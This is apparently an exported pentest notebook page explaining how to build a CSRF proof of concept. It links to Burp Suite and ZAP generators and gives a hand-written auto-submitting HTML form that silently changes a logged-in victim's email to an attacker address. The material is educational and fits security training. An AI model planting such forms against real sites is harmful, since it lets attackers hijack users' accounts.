<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>How to construct a CSRF attack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>How to construct a CSRF attack</h1><br /><strong>
      <h3>Automate the construction of the PoC</h3>
    </strong><br />See the subchapters to see how to construct a PoC with Burpsuite and ZAP<br />• <a
      href="-WebApp_Pentest--Exploitation--Client-Side--Cross-Site_Request_Forgery_(CSRF-XSRF)--How_to_construct_a_CSRF_attack--ZAP_generate_CSRF_Poc.html">ZAP:
      generate CSRF Poc</a><br />• <a
      href="p_Pentest--Exploitation--Client-Side--Cross-Site_Request_Forgery_(CSRF-XSRF)--How_to_construct_a_CSRF_attack--BurpSuite_Generate_CSRF_PoC.html">BurpSuite:
      generate CSRF Poc</a> (only for BurpSuite Professional)<br /><br /><strong>
      <h3>Manually construct a POC</h3>
    </strong><br />1. Once we have found a CSRF vulnerability in a website<br />2. The attacker can construct a web page
    containing the following example HTML:<br />
    <div class="codebox">
      <div class="codebox">
        &lt;html&gt;<br />&nbsp;&nbsp;&lt;body&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=&quot;https://vulnerable-website.com/email/change&quot;&nbsp;method=&quot;POST&quot;&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;hidden&quot;&nbsp;name=&quot;email&quot;&nbsp;value=&quot;pwned@evil-user.net&quot;&nbsp;/&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.forms[0].submit();<br />&nbsp;&nbsp;&nbsp;&nbsp;&lt;/script&gt;<br />&nbsp;&nbsp;&lt;/body&gt;<br /><span
          style="color:#000000;font-weight:400">&lt;</span>/html<span style="color:#000000;font-weight:400">&gt;</span>
      </div>
    </div><br /> in the above example we want to change the email of the user that visit our page, but we can edit the
    above example to allign it with our necessity<br /><span style="text-decoration:underline;">If a victim user visits
      the attacker&#39;s web page, the following will happen:</span><br /> ◇ The attacker&#39;s page will trigger an
    HTTP request to the vulnerable web site.<br /> ◇ If the user is logged in to the vulnerable web site, their browser
    will automatically include their session cookie in the request (assuming <a
      href="https://portswigger.net/web-security/csrf/samesite-cookies" target="_blank">SameSite cookies</a> are not being used).<br />
    ◇ The vulnerable web site will process the request in the normal way, treat it as having been made by the victim
    user, and change their email address.<br /><br />
  </div>
</body>

</html>